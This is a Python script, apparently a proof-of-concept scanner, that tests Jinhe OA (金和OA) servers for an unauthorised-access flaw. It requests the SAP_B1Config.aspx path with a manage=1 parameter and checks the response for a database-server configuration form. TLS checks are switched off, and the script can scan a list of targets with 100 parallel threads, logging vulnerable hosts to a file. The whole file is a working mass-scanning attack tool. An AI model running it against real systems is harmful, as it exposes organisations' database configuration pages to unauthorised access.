import requests,argparse,sys,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """       ___       __  __           ____  ___                                 __  __               _                __
      / (_)___  / / / /__        / __ \/   |       __  ______  ____ ___  __/ /_/ /_  ____  _____(_)___  ___  ____/ /
 __  / / / __ \/ /_/ / _ \______/ / / / /| |______/ / / / __ \/ __ `/ / / / __/ __ \/ __ \/ ___/ /_  / / _ \/ __  / 
/ /_/ / / / / / __  /  __/_____/ /_/ / ___ /_____/ /_/ / / / / /_/ / /_/ / /_/ / / / /_/ / /  / / / /_/  __/ /_/ /  
\____/_/_/ /_/_/ /_/\___/      \____/_/  |_|     \__,_/_/ /_/\__,_/\__,_/\__/_/ /_/\____/_/  /_/ /___/\___/\__,_/   
                                                                                                                    """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='金和OA 未授权')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1'
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=10)
        if '数据库服务器名' in res.text and '保存' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
                return True
        else:
            return False
    except Exception as e:
        return False
        
if __name__ == '__main__':
    main()